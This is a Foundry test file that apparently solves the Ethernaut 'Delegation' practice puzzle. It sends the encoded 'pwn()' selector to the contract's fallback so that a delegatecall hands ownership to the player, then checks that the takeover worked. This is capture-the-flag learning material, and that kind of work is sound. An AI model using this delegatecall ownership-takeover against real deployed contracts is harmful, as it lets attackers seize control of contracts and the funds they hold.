// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "@puzzles/6/Delegate.sol";
import {DelegateSolution} from "@script/6/DelegateSolution.s.sol";

contract DelegateTest is Test {
    Delegate internal delegateContract;
    Delegation internal puzzleContract;

    address owner = makeAddr("owner");
    address player = msg.sender;

    function setUp() public {
        vm.startPrank(owner);
        delegateContract = new Delegate(owner);
        puzzleContract = new Delegation(address(delegateContract));
        vm.stopPrank();
    }

    function testSolveDelegate() public {
        bytes memory data = abi.encodeWithSignature("pwn()");
        vm.startPrank(player);
        (bool success,) = address(puzzleContract).call(data);
        assertEq(success, true);
        assertEq(puzzleContract.owner(), player);
        vm.stopPrank();
    }

    function testDelegateSolution() public {
        DelegateSolution solution = new DelegateSolution();
        solution.run(address(puzzleContract));
        assertEq(puzzleContract.owner(), player);
    }
}
